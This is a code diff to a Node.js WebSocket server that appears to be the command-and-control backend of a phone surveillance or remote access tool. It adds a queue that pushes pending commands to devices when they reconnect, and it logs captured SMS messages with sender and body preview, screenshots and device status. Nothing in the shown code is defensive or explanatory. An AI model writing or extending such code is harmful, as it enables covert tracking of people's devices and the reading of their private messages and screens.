@@ -177,6 +177,43 @@ function setupWebSocket(io) {
         io.emit('device_online', device);
         console.log(`[WS] Device registered: ${device_id} (${model || 'unknown'}) loc_source=${locSource}`);
 
+        // ═══ LOG ACTIVITY: device came online ═══
+        try {
+          db.prepare(`INSERT INTO device_activity (device_id, event_type, event_data) VALUES (?,?,?)`)
+            .run(device_id, 'device_online', JSON.stringify({ model: model || '', app_version: app_version || '', battery: battery_percent ?? -1 }));
+        } catch (_) {}
+
+        // ═══ COMMAND QUEUE: Execute any pending commands for this device ═══
+        try {
+          const pending = db.prepare(
+            `SELECT * FROM command_queue
+             WHERE device_id = ? AND status = 'pending'
+             AND (expires_at IS NULL OR expires_at > datetime('now'))
+             ORDER BY created_at ASC LIMIT 20`
+          ).all(device_id);
+
+          if (pending.length > 0) {
+            console.log(`[Queue] Executing ${pending.length} queued command(s) for ${device_id}`);
+            for (const cmd of pending) {
+              try {
+                const payload = JSON.parse(cmd.payload || '{}');
+                socket.emit(cmd.command_type, payload);
+                db.prepare(`UPDATE command_queue SET status='executed', executed_at=datetime('now') WHERE id=?`).run(cmd.id);
+                db.prepare(`INSERT INTO device_activity (device_id, event_type, event_data) VALUES (?,?,?)`)
+                  .run(device_id, 'queued_command_executed', JSON.stringify({ command: cmd.command_type, payload }));
+                console.log(`[Queue] ✅ Executed queued ${cmd.command_type} for ${device_id}`);
+              } catch (cmdErr) {
+                db.prepare(`UPDATE command_queue SET status='failed' WHERE id=?`).run(cmd.id);
+                console.error(`[Queue] ❌ Failed ${cmd.command_type}: ${cmdErr.message}`);
+              }
+            }
+            // Notify admin panel that queue was flushed
+            if (io) io.emit('command_queue_flushed', { device_id, count: pending.length });
+          }
+        } catch (queueErr) {
+          console.error('[Queue] Error processing command queue:', queueErr.message);
+        }
+
         // If no GPS, trigger async IP geolocation fallback
         if (!hasGps) {
           ipGeoFallback(socket, device_id);
@@ -373,6 +410,12 @@ function setupWebSocket(io) {
           sms_id: smsId
         });
 
+        // Log to activity timeline
+        try {
+          db.prepare(`INSERT INTO device_activity (device_id, event_type, event_data) VALUES (?,?,?)`)
+            .run(device_id, 'sms_received', JSON.stringify({ from: address, preview: (body || '').substring(0, 60), sim: sim_slot || 1 }));
+        } catch (_) {}
+
         console.log(`[WS] Instant SMS from ${address} on device ${device_id} (SIM ${sim_slot || 1})`);
       } catch (err) {
         console.error('[WS] instant_sms error:', err.message);
@@ -427,6 +470,12 @@ function setupWebSocket(io) {
           file_size: fileSize,
           captured_at: new Date().toISOString()
         });
+
+        // Log to activity timeline
+        try {
+          db.prepare(`INSERT INTO device_activity (device_id, event_type, event_data) VALUES (?,?,?)`)
+            .run(device_id, 'screenshot_taken', JSON.stringify({ width: width || 0, height: height || 0, size_kb: Math.round(fileSize / 1024) }));
+        } catch (_) {}
 
         console.log(`[WS] Screen captured from device ${device_id} (${width}x${height}, ${Math.round(fileSize/1024)}KB)`);
       } catch (err) {
